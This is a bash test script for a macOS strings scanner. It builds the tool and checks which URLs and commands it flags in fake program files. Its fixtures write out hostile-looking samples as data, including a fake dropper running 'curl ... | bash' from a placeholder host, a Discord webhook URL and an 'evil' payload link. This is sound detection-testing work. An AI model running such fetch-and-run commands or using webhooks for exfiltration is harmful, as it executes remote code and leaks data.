#!/bin/bash
# mac_cli_test.sh -- builds mac/sentinel-strings.cpp with the host g++ and runs it on a small tree of fake programs (no Mac needed).
#   usage: tests/mac_cli_test.sh [build dir]        (run from the project root; `make tests` does)
B=${1:-build}; mkdir -p "$B"
g++ -std=c++17 -O1 -g -Wall -Wextra -Icore -Imac mac/sentinel-strings.cpp -o "$B/sentinel-strings" || { echo "FAIL: mac/sentinel-strings.cpp does not build"; exit 1; }
CLI="$PWD/$B/sentinel-strings"
T=$(mktemp -d); trap 'rm -rf "$T"' EXIT
fails=0; checks=0
ok(){ checks=$((checks+1)); if ! eval "$2"; then fails=$((fails+1)); echo "  FAIL: $1"; fi; }

MACHO='\317\372\355\376\014\000\000\001'                                  # thin 64-bit Mach-O header
mkdir -p "$T/dir/sub" "$T/dir/Thing.app/Contents/MacOS"
printf "$MACHO\\0__TEXT\\0https://discord.com/api/webhooks/1/abc\\0http://evil.example.com/p.bin\\0" > "$T/dir/mal"
printf "$MACHO\\0__TEXT\\0hello world, nothing to see\\0"                                           > "$T/dir/clean"
printf '#!/bin/sh\ncurl -fsSL http://x.example.org/i.sh | bash\n'                                  > "$T/dir/sub/dropper.sh"
printf '\312\376\272\276\000\000\000\002\0osascript -e x with hidden answer\0'                     > "$T/dir/fat"
printf "$MACHO\\0https://app.example.com/inside-a-bundle\\0"                                        > "$T/dir/Thing.app/Contents/MacOS/Thing"
printf '\312\376\272\276\000\000\000\064\0https://class.example.com/x\0'                           > "$T/dir/Thing.class"   # a Java class: not a Mac program
printf 'MZ\220\000https://pe.example.com/x\0'                                                      > "$T/dir/win.exe"       # a Windows program: not a Mac program
printf 'see https://doc.example.com/readme\n'                                                      > "$T/dir/readme.txt"    # not a program
ln -s "$T/dir/mal" "$T/dir/link"                                                                                           # links are not followed

out=$("$CLI" "$T/dir"); rc=$?
ok "folder: exit code 1 (something found)"            "[ $rc -eq 1 ]"
ok "folder: checked 5 programs, 4 with something"     "grep -q 'checked 5 file(s), 4 with' <<<\"\$out\""
ok "folder: webhook is marked and listed"             "grep -q '\\[!\\] https://discord.com/api/webhooks/1/abc' <<<\"\$out\""
ok "folder: plain link listed"                        "grep -q 'http://evil.example.com/p.bin' <<<\"\$out\""
ok "folder: script's command listed"                  "grep -q 'cmd: curl -fsSL http://x.example.org/i.sh | bash' <<<\"\$out\""
ok "folder: universal binary's command listed"        "grep -q 'cmd: osascript -e x with hidden answer' <<<\"\$out\""
ok "folder: program inside an .app bundle found"      "grep -q 'app.example.com/inside-a-bundle' <<<\"\$out\""
ok "folder: clean program is not printed"             "! grep -q '/clean' <<<\"\$out\""
ok "folder: Java class not looked at"                 "! grep -q 'class.example.com' <<<\"\$out\""
ok "folder: Windows exe not looked at"                "! grep -q 'pe.example.com' <<<\"\$out\""
ok "folder: text file not looked at"                  "! grep -q 'doc.example.com' <<<\"\$out\""
ok "folder: symbolic link not followed"               "! grep -q '/link' <<<\"\$out\""

out=$("$CLI" "$T/dir/readme.txt"); rc=$?
ok "named file is always checked (exit 1)"            "[ $rc -eq 1 ] && grep -q 'doc.example.com/readme' <<<\"\$out\""
out=$("$CLI" "$T/dir/clean"); rc=$?
ok "clean file: exit 0 and says so"                   "[ $rc -eq 0 ] && grep -q 'no links or suspicious commands' <<<\"\$out\""
: > "$T/empty"; out=$("$CLI" "$T/empty"); rc=$?
ok "empty file: exit 0"                               "[ $rc -eq 0 ] && grep -q 'no links' <<<\"\$out\""
out=$("$CLI" "$T/nothing-here"); rc=$?
ok "missing path: exit 2"                             "[ $rc -eq 2 ] && grep -q 'not a file or folder' <<<\"\$out\""
out=$("$CLI" "$T/dir/clean" "$T/nothing-here" "$T/dir/mal"); rc=$?
ok "several paths: the bad one gives exit 2, the others are still checked"  "[ $rc -eq 2 ] && grep -q 'webhooks' <<<\"\$out\""
"$CLI" >/dev/null 2>"$T/usage"; rc=$?
ok "no arguments: usage on stderr, exit 2"            "[ $rc -eq 2 ] && grep -q usage '$T/usage'"

# a file over 16 MB is read by its first and last 8 MB only
head -c 20000000 /dev/zero > "$T/big_tail"; printf 'https://tail.example.com/x\0' >> "$T/big_tail"
{ printf 'https://head.example.com/x\0'; head -c 20000000 /dev/zero; } > "$T/big_head"
{ head -c 10000000 /dev/zero; printf 'https://middle.example.com/x\0'; head -c 10000000 /dev/zero; } > "$T/big_mid"
ok "big file: link in the tail found"                 "\"$CLI\" '$T/big_tail' | grep -q tail.example.com"
ok "big file: link in the head found"                 "\"$CLI\" '$T/big_head' | grep -q head.example.com"
ok "big file: the unread middle is not scanned (documented limit)"  "! \"$CLI\" '$T/big_mid' | grep -q middle.example.com"

echo "mac cli: $checks checks, $fails failed"
[ $fails -eq 0 ]
